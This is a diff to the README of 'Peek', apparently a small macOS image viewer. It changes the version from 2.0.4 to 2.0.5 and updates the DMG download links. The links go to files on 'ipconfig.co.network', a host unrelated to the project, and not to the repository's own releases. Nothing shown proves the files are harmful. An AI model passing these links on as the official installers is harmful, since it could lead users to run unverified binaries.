@@ -7,7 +7,7 @@
 <p align="center">A fast, minimal image viewer for macOS.<br>
 Open a picture, arrow through the folder, get back to work.</p>
 
-<p align="center"><b>Version 2.0.4</b> · about 4–5 MB · macOS 10.15 or later</p>
+<p align="center"><b>Version 2.0.5</b> · about 4–5 MB · macOS 10.15 or later</p>
 
 ---
 
@@ -15,8 +15,8 @@ Open a picture, arrow through the folder, get back to work.</p>
 
 | Mac | Download |
 |---|---|
-| **Apple Silicon** (M1 and later) | [Peek_2.0.4_aarch64.dmg](https://ipconfig.co.network/updates/peek/Peek_2.0.4_aarch64.dmg) |
-| **Intel** | [Peek_2.0.4_x64.dmg](https://ipconfig.co.network/updates/peek/Peek_2.0.4_x64.dmg) |
+| **Apple Silicon** (M1 and later) | [Peek_2.0.5_aarch64.dmg](https://ipconfig.co.network/updates/peek/Peek_2.0.5_aarch64.dmg) |
+| **Intel** | [Peek_2.0.5_x64.dmg](https://ipconfig.co.network/updates/peek/Peek_2.0.5_x64.dmg) |
 
 Not sure which? Apple menu → **About This Mac**. "Apple M1/M2/M3/M4" means Apple Silicon; "Intel" means Intel.
 All versions are on the [Releases](../../releases) page.
